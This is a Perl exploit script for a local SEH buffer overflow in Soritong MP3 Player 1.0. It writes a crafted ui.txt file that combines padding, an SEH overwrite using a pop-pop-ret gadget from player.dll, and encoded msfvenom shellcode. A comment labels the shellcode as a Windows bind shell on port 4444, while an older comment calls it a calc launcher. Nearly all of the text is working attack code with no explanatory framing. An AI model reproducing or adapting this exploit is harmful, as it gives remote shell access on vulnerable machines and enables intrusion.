#!/usr/bin/perl

###################################################
#Soritong MP# Player 1.0 Universal Local BoF (SEH)#
###########https://github.com/jacobforer###########
###################################################

my $junk = "A" x 584;

my $nextSEHoverwrite = "\xeb\x06\x90\x90" ; #jump 6 bytes

my $SEHoverwrite = pack('V', 0x1001E067); #pop pop ret from player.dll

# win32_exec - EXITFUNC=seh CMD=calc Size=343 Encoder=PexAlphaNum
#msfvenom -a x86 --platform Windows -p windows/shell_bind_tcp LHOST=172.16.73.129 LPORT=4444 -e x86/shikata_ga_nai -b '\x00\x0a\x0d' -f perl
my $shellcode =
"\xbd\xad\x2f\x1b\xc5\xdb\xd9\xd9\x74\x24\xf4\x5e\x2b\xc9" .
"\xb1\x53\x83\xee\xfc\x31\x6e\x0e\x03\xc3\x21\xf9\x30\xe7" .
"\xd6\x7f\xba\x17\x27\xe0\x32\xf2\x16\x20\x20\x77\x08\x90" .
"\x22\xd5\xa5\x5b\x66\xcd\x3e\x29\xaf\xe2\xf7\x84\x89\xcd" .
"\x08\xb4\xea\x4c\x8b\xc7\x3e\xae\xb2\x07\x33\xaf\xf3\x7a" .
"\xbe\xfd\xac\xf1\x6d\x11\xd8\x4c\xae\x9a\x92\x41\xb6\x7f" .
"\x62\x63\x97\x2e\xf8\x3a\x37\xd1\x2d\x37\x7e\xc9\x32\x72" .
"\xc8\x62\x80\x08\xcb\xa2\xd8\xf1\x60\x8b\xd4\x03\x78\xcc" .
"\xd3\xfb\x0f\x24\x20\x81\x17\xf3\x5a\x5d\x9d\xe7\xfd\x16" .
"\x05\xc3\xfc\xfb\xd0\x80\xf3\xb0\x97\xce\x17\x46\x7b\x65" .
"\x23\xc3\x7a\xa9\xa5\x97\x58\x6d\xed\x4c\xc0\x34\x4b\x22" .
"\xfd\x26\x34\x9b\x5b\x2d\xd9\xc8\xd1\x6c\xb6\x3d\xd8\x8e" .
"\x46\x2a\x6b\xfd\x74\xf5\xc7\x69\x35\x7e\xce\x6e\x3a\x55" .
"\xb6\xe0\xc5\x56\xc7\x29\x02\x02\x97\x41\xa3\x2b\x7c\x91" .
"\x4c\xfe\xe9\x99\xeb\x51\x0c\x64\x4b\x02\x90\xc6\x24\x48" .
"\x1f\x39\x54\x73\xf5\x52\xfd\x8e\xf6\x4d\xa2\x07\x10\x07" .
"\x4a\x4e\x8a\xbf\xa8\xb5\x03\x58\xd2\x9f\x3b\xce\x9b\xc9" .
"\xfc\xf1\x1b\xdc\xaa\x65\x90\x33\x6f\x94\xa7\x19\xc7\xc1" .
"\x30\xd7\x86\xa0\xa1\xe8\x82\x52\x41\x7a\x49\xa2\x0c\x67" .
"\xc6\xf5\x59\x59\x1f\x93\x77\xc0\x89\x81\x85\x94\xf2\x01" .
"\x52\x65\xfc\x88\x17\xd1\xda\x9a\xe1\xda\x66\xce\xbd\x8c" .
"\x30\xb8\x7b\x67\xf3\x12\xd2\xd4\x5d\xf2\xa3\x16\x5e\x84" .
"\xab\x72\x28\x68\x1d\x2b\x6d\x97\x92\xbb\x79\xe0\xce\x5b" .
"\x85\x3b\x4b\x6b\xcc\x61\xfa\xe4\x89\xf0\xbe\x68\x2a\x2f" .
"\xfc\x94\xa9\xc5\x7d\x63\xb1\xac\x78\x2f\x75\x5d\xf1\x20" .
"\x10\x61\xa6\x41\x31";

my $junk2   = "\x90" x 1000;

open(myfile,'>ui.txt');

print myfile $junk.$nextSEHoverwrite.$SEHoverwrite.$shellcode.$junk2;
